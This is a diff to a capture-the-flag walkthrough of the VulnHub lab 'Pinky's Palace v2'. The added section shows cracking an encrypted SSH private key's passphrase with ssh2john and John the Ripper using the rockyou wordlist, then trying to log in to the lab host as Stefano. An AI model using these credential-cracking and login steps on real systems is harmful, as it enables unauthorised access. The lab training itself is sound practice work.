@@ -1,5 +1,10 @@
 # Pinky's Palace: v2
 
+Available on VulnHub:
+https://www.vulnhub.com/entry/pinkys-palace-v2,229/
+
+With thanks to Pink_Panther!
+
 ## Identify the target server IP address using Nmap
 
 ```
@@ -386,6 +391,62 @@ Clearly these need to be used on the SSH port that was opened (Port# 4655).
 
 ## SSH with Stefano the Intern Web developer
 
+Okay, time to set the permissions correctly for id_rsa and try it against the server.
 
+```
+root@kali:~/Documents/Vanquish/pinkydb# chmod 600 id_rsa
+root@kali:~/Documents/Vanquish/pinkydb# ssh -i id_rsa Stefano@192.168.225.130 -p 4655
+The authenticity of host '[192.168.225.130]:4655 ([192.168.225.130]:4655)' can't be established.
+ECDSA key fingerprint is SHA256:u986iF153Xa6BbFapGcWhsyzav6u/iFhjUwFkG3+zTk.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[192.168.225.130]:4655' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+```
 
+Looks like the RSA key is encrypyted and we need a passphrase in order to use it.
+This should have been apparent based on the Encrypted reference within the id_rsa key file:
+```
+Proc-Type: 4,ENCRYPTED
+```
 
+The go to tool for cracking an key passphrase is John the ripper:
+
+```
+root@kali:~/Documents/Vanquish/pinkydb# ssh2john id_rsa > shadow
+root@kali:~/Documents/Vanquish/pinkydb# cat /usr/share/wordlists/rockyou.txt | john --pipe --rules shadow
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA 32/32])
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+secretz101       (id_rsa)
+1g 0:00:00:51  0.01959g/s 541516p/s 541516c/s 541516C/s secretz101
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+The passphrase for the id_rsa private key file is `secretz101`
+
+```
+root@kali:~/Documents/Vanquish/pinkydb# ssh -i id_rsa Stefano@192.168.225.130 -p 4655
+Enter passphrase for key 'id_rsa': 
+Stefano@192.168.225.130's password: 
+Permission denied, please try again.
+```
+
+Adding -v to ssh to get more details on what is happening.
+
+```
+root@kali:~/Documents/Vanquish/pinkydb# ssh -v -i id_rsa Stefano@192.168.225.130 -p 4655
+OpenSSH_7.3p1 Debian-1, OpenSSL 1.0.2h  3 May 2016
+debug1: Reading configuration data /root/.ssh/config
+debug1: Reading configuration data /etc/ssh/ssh_config
+---SNIP---
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: publickey
+debug1: Trying private key: id_rsa
+Enter passphrase for key 'id_rsa': 
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: password
+Stefano@192.168.225.130's password: 
+```
+
+Pinkydb appears to want BOTH an public key and a password
